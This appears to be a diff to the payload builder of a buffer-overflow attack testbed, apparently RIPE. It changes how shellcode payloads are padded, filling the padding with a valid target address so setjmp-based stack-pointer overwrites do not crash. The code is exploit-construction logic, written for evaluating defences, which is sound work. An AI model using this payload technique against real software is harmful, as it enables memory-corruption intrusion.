@@ -897,13 +897,24 @@ build_payload(struct payload * payload, ptrdiff_t offset, uint8_t * shellcode, s
     size_t bytes_to_pad =
       (payload->size - size_shellcode - sizeof(void *) - sizeof(char));
 
-    /* Pad payload buffer with dummy bytes */
-    memset((payload->buffer + size_shellcode), 'A', bytes_to_pad);
-
     if (g.output_debug_info) {
         dbg("bytes to pad: %zu\n", bytes_to_pad);
         dbg("overflow_ptr: %p\n", payload->overflow_ptr);
     }
+
+    /* In general we could pad the payload buffer with any data.
+     * However, we pad with a related legal address to help setjmp-based attacks
+     * on architectures where we overwrite the later restored SP.
+     * This allows the invoked code to use the pointed to memory as fake stack
+     * without immediately crashing on stack operations.
+     * For more complicated cases we might have to get more creative. */
+    RIPE_JMPBUF_TYPE *pad = (RIPE_JMPBUF_TYPE *)&payload->buffer[size_shellcode + bytes_to_pad];
+    for (size_t i = 0; i < bytes_to_pad/sizeof(RIPE_JMPBUF_TYPE); i++) {
+        pad[-i] = (RIPE_JMPBUF_TYPE)g.of_target;
+    }
+
+    /* Pad the remaining bytes with 'A', if any. */
+    memset((payload->buffer + size_shellcode), 'A', bytes_to_pad%sizeof(RIPE_JMPBUF_TYPE));
 
     memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
            &payload->overflow_ptr,
